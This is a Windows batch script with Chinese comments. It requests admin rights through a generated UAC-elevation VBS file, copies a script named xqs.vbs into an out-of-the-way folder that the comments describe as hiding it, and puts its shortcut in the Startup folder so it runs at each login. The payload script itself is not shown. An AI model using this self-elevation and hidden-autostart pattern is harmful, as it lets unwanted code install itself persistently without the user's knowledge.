@echo on
cd /d "%~dp0"

cacls.exe "%SystemDrive%\System Volume Information" >nul 2>nul

if %errorlevel%==0 goto Admin

if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"

echo Set RequestUAC = CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"

echo RequestUAC.ShellExecute "%~s0","","","runas",1 >>"%temp%\getadmin.vbs"

echo WScript.Quit >>"%temp%\getadmin.vbs"
"%temp%\getadmin.vbs" /f

if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"

exit


:Admin
::创建文件夹
md D:\MyDocuments\Programmer\jelly
::藏到电脑里
copy /y "%~dp0xqs.vbs" D:\MyDocuments\Programmer\jelly\
start %SystemRoot%/System32/WScript.exe "%~dp0lnk.vbs"

::延迟执行
choice /t 1 /d y /n >nul  
::设为自启动
copy /y "%userprofile%\Desktop\xqs.lnk" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
::删除桌面快捷方式
del /f /s /q "%userprofile%\Desktop\xqs.lnk"
::刷新桌面
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
pause